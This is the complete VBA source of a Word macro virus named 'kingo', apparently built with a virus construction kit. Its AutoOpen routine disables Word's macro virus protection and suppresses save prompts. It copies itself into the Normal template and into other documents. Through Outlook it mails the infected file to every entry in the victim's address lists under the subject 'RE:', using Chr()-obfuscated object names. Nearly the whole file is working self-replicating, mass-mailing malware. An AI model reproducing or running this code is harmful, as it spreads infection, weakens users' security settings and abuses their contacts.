Attribute VB_Name = "NewMacros"
'Module Name: kingo
'***Generated with: IMVM v2 by MI_pirat***
'Copy the code in a module with the same name as the virus:
Sub AutoOpen()
'The kingo Virus
'by Ahmedo
On Error Resume Next
If System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Office\", "kingo") <> "kingo" Then
System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Office\", "kingo") = "kingo"
Options.VirusProtection = (2 Xor 2)
Options.SaveNormalPrompt = False
With Options
        .AllowFastSave = True
        .BackgroundSave = True
        .CreateBackup = False
        .SavePropertiesPrompt = False
        .ConfirmConversions = False
        .UpdateLinksAtOpen = True
        .SendMailAttach = True
End With
Set myTemplate = NormalTemplate
Application.OrganizerCopy Source:=ActiveDocument.FullName, Destination:=myTemplate.FullName, Name:="kingo", Object:=wdOrganizerObjectProjectItems
Documents.Open FileName:=NormalTemplate.FullName, ConfirmConversions:=False, ReadOnly:=False, AddToRecentFiles:=False, PasswordDocument:="", Format:=wdOpenFormatAuto
ActiveDocument.Save
ActiveDocument.Close
mmm = Chr(79) + Chr(117) + Chr(116) + Chr(108) + Chr(111) + Chr(111) + Chr(107)
Set DOutlook = CreateObject(mmm + Chr(46) + Chr(65) + Chr(112) + Chr(112) + Chr(108) + Chr(105) + Chr(99) + Chr(97) + Chr(116) + Chr(105) + Chr(111) + Chr(110))
xxx = Chr(77) + Chr(65) + Chr(80) + Chr(73)
Set DMName = DOutlook.GetNameSpace(xxx)
Set mmm = DMName.AddressLists
For ik = 1 To mmm.Count
Set ABook = DMName.AddressLists(ik)
xxx = 1
Set aa = ABook.AddressEntries
Set BreakUmOffAS = DOutlook.CreateItem(0)
For ij = 1 To aa.Count
Pee = aa(xxx)
BreakUmOffAS.Recipients.Add Pee
xxx = xxx + 1
If xxx > 20 Then nr = aa.Count
Next ij
strip = ActiveDocument.FullName
BreakUmOffAS.Subject = "RE:"
BreakUmOffAS.Body = "Read the doc. "
BreakUmOffAS.Attachments.Add strip
BreakUmOffAS.Send
Pee = ""
Next ik
End If
dday = Weekday(Date)
If dday = 6 Then
MsgBox "Ahmedo the KiNGo", vbInformation
End If
For Each aVar In ActiveDocument.Variables
        If aVar.Name = "kingo" Then nm = aVar.Index
Next aVar
If (nm = 0) And (NormalTemplate.FullName <> ActiveDocument.FullName) Then
ActiveDocument.Variables.Add Name:="kingo"
ActiveDocument.Variables("kingo").Value = 666
Set myTemplate = NormalTemplate
Application.OrganizerCopy Source:=myTemplate.FullName, Destination:=ActiveDocument.FullName, Name:=myTemplate.VBProject.VBComponents(2).Name, Object:=wdOrganizerObjectProjectItems
ActiveDocument.Save
End If
End Sub
